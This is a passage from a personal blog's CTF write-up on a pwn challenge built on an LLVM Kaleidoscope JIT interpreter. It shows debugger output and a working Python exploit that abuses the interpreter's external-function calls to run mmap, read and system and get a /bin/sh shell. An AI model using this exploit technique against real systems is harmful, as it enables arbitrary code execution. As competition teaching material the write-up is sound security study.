class="number">0xfbad2887</span></span><br><span class="line"> RSP  <span class="number">0x7fffffffdd08</span> —▸ <span class="number">0x7ffff7ff6012</span> ◂— pop    rcx</span><br><span class="line"> RIP  <span class="number">0x7ffff36899c0</span> (<span class="built_in">puts</span>) ◂— push   r13</span><br><span class="line">────────────────────────────────────────[ DISASM ]─────────────────────────────────────────</span><br><span class="line"> ► <span class="number">0x7ffff36899c0</span> &lt;<span class="built_in">puts</span>&gt;       push   r13</span><br><span class="line">   <span class="number">0x7ffff36899c2</span> &lt;<span class="built_in">puts</span>+<span class="number">2</span>&gt;     push   r12</span><br><span class="line">   <span class="number">0x7ffff36899c4</span> &lt;<span class="built_in">puts</span>+<span class="number">4</span>&gt;     mov    r12, rdi</span><br><span class="line">   <span class="number">0x7ffff36899c7</span> &lt;<span class="built_in">puts</span>+<span class="number">7</span>&gt;     push   rbp</span><br><span class="line">   <span class="number">0x7ffff36899c8</span> &lt;<span class="built_in">puts</span>+<span class="number">8</span>&gt;     push   rbx</span><br><span class="line">   <span class="number">0x7ffff36899c9</span> &lt;<span class="built_in">puts</span>+<span class="number">9</span>&gt;     sub    rsp, <span class="number">8</span></span><br><span class="line">   <span class="number">0x7ffff36899cd</span> &lt;<span class="built_in">puts</span>+<span class="number">13</span>&gt;    call   *ABS*+<span class="number">0x9dc70</span>@plt &lt;<span class="number">0x7ffff362a100</span>&gt;</span><br><span class="line"> </span><br><span class="line">   <span class="number">0x7ffff36899d2</span> &lt;<span class="built_in">puts</span>+<span class="number">18</span>&gt;    mov    rbp, qword ptr [rip + <span class="number">0x36be6f</span>] &lt;<span class="number">0x7ffff39f5848</span>&gt;</span><br><span class="line">   <span class="number">0x7ffff36899d9</span> &lt;<span class="built_in">puts</span>+<span class="number">25</span>&gt;    mov    rbx, rax</span><br><span class="line">   <span class="number">0x7ffff36899dc</span> &lt;<span class="built_in">puts</span>+<span class="number">28</span>&gt;    mov    eax, dword ptr [rbp]</span><br><span class="line">   <span class="number">0x7ffff36899df</span> &lt;<span class="built_in">puts</span>+<span class="number">31</span>&gt;    mov    rdi, rbp</span><br><span class="line">─────────────────────────────────────────[ STACK ]─────────────────────────────────────────</span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp  <span class="number">0x7fffffffdd08</span> —▸ <span class="number">0x7ffff7ff6012</span> ◂— pop    rcx</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│      <span class="number">0x7fffffffdd10</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│      <span class="number">0x7fffffffdd18</span> —▸ <span class="number">0x55555555b0d4</span> (main+<span class="number">3732</span>) ◂— mov    ecx, eax</span><br><span class="line">03:0018│      0x7fffffffdd20 —▸ 0x7fffffffdd30 ◂— '__anon_expr'</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│      <span class="number">0x7fffffffdd28</span> ◂— <span class="number">0xb</span> <span class="comment">/* '\x0b' */</span></span><br><span class="line">05:0028│      0x7fffffffdd30 ◂— '__anon_expr'</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│      <span class="number">0x7fffffffdd38</span> ◂— <span class="number">0x727078</span> <span class="comment">/* 'xpr' */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│ r14  <span class="number">0x7fffffffdd40</span> —▸ <span class="number">0x7ffff7ff6000</span> ◂— push   rax</span><br><span class="line">───────────────────────────────────────[ BACKTRACE ]───────────────────────────────────────</span><br><span class="line"> ► f <span class="number">0</span>     <span class="number">7f</span>fff36899c0 <span class="built_in">puts</span></span><br><span class="line">   f <span class="number">1</span>     <span class="number">7f</span>fff7ff6012</span><br><span class="line">   f <span class="number">2</span>                <span class="number">0</span></span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">Breakpoint <span class="built_in">puts</span></span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></table></figure>
<p>We can see that the first argument <code>$rdi</code> is <code>0x28=40</code>, that means we can control the argument too.</p>
<h2 id="exploit"><a class="header-anchor" href="#exploit">¶</a>Exploit</h2>
<p>With the handy arbitrary libc function calling ability, it should be quite straightforward to get a shell. The binary was protected by <code>PIE</code>, so we don’t know any address information initially.  My solution is using <code>mmap</code> to get an new region like <code>0x100000</code> and use <code>read</code> to load the <code>/bin/sh</code> string into memory. Finally we can call <code>system(0x100000)</code> to get shell.</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">"""</span></span><br><span class="line"><span class="string"> def mmap(x y z o p)</span></span><br><span class="line"><span class="string">  if x &lt; 3 then</span></span><br><span class="line"><span class="string">   1</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string"> a=666</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string"> 0=666</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string"> b=666</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string"> 0=666</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string"> c=666</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">mmap(1048576, 4096, 7, 34, 0);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>, payload)</span><br><span class="line">time.sleep(<span class="number">0.5</span>)</span><br><span class="line">payload = <span class="string">"""</span></span><br><span class="line"><span class="string">def read(x y z)</span></span><br><span class="line"><span class="string">  if m &lt; 3 then</span></span><br><span class="line"><span class="string">   1</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string"> 0=666</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def system(x)</span></span><br><span class="line"><span class="string">  if m &lt; 3 then</span></span><br><span class="line"><span class="string">   1</span></span><br><span class="line"><span class="string">  else</span></span><br><span class="line"><span class="string"> 0=666</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">read(0, 1048576, 10);</span></span><br><span class="line"><span class="string">system(1048576);</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">sla(<span class="string">"&gt;"</span>, payload)</span><br><span class="line">sla(<span class="string">"&gt;"</span>, <span class="string">"/bin/sh\x00"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>I spent some time to tune the <code>if-else</code> statements according to the number of arguments to make it accept by the interpreter, but later find it is unnecessary, any function definition with <code>if-else</code> statement will be regard as external function.</p>
<h2 id="wrapup"><a class="header-anchor" href="#wrapup">¶</a>Wrapup</h2>
<p>This is the first time I used fuzzing technique to solve a challenge during a CTF. As you can see, this is a promising skill in competition, it can save plenty of time from reverse engineering. In terms of the interpreter pwn challenges, I had came across some like Javascript, Lua (see <a href="http://blog.leanote.com/post/xp0int/%5BPWN%5D-ls-cpt.shao%E3%80%81MF" target="_blank" rel="noopener">another writeup at of XNUCA2019</a>), and this Kaleidoscope, many of them were related to the external function calling or, foreign function interface (FFI). So this might be the thing to look at when you meet a interpreter-based pwn challenge.</p>
<h2 id="references"><a class="header-anchor" href="#references">¶</a>References</h2>
<ol>
<li><a href="https://llvm.org/docs/tutorial/BuildingAJIT1.html" target="_blank" rel="noopener">https://llvm.org/docs/tutorial/BuildingAJIT1.html</a></li>
<li><a href="https://github.com/ghaiklor/llvm-kaleidoscope" target="_blank" rel="noopener">https://github.com/ghaiklor/llvm-kaleidoscope</a></li>
<li><a href="https://hub.docker.com/r/zjuchenyuan/honggfuzz" target="_blank" rel="noopener">https://hub.docker.com/r/zjuchenyuan/honggfuzz</a></li>
<li><a href="https://github.com/google/honggfuzz/blob/master/docs/USAGE.md" target="_blank" rel="noopener">https://github.com/google/honggfuzz/blob/master/docs/USAGE.md</a></li>
<li><a href="https://llvm.org/docs/tutorial/OCamlLangImpl1.html#the-basic-language" target="_blank" rel="noopener">https://llvm.org/docs/tutorial/OCamlLangImpl1.html#the-basic-language</a></li>
<li><a href="http://blog.leanote.com/post/xp0int/%5BPWN%5D-ls-cpt.shao%E3%80%81MF" target="_blank" rel="noopener">http://blog.leanote.com/post/xp0int/[PWN]-ls-cpt.shao、MF</a></li>
</ol>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2019/11/03/永恒的终结/" rel="next" title="永恒的终结">
                <i class="fa fa-chevron-left"></i> 永恒的终结
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2019/12/05/RealWorldCTF2018-Station-Escape/" rel="prev" title="[RealWorldCTF2018] Station Escape">
                [RealWorldCTF2018] Station Escape <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目錄
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            本站概覽
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
          <p class="site-author-name" itemprop="name">Matthew Shao</p>
          <p class="site-description motion-element" itemprop="description">被酒莫惊春睡重，赌书消得泼茶香</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">56</span>
                <span class="site-state-item-name">文章</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">分類</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">標籤</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#recon"><span class="nav-number">1.</span> <span class="nav-text">¶Recon</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#fuzzing"><span class="nav-number">2.</span> <span class="nav-text">¶Fuzzing</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#crashes"><span class="nav-number">3.</span> <span class="nav-text">¶Crashes</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#analysis"><span class="nav-number">4.</span> <span class="nav-text">¶Analysis</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exploit"><span class="nav-number">5.</span> <span class="nav-text">¶Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#wrapup"><span class="nav-number">6.</span> <span class="nav-text">¶Wrapup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#references"><span class="nav-number">7.</span> <span class="nav-text">¶References</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
</div>

<div class="theme-info">
  主題 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Logos
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  




  
  

  

  

  

  


</body>
</html>
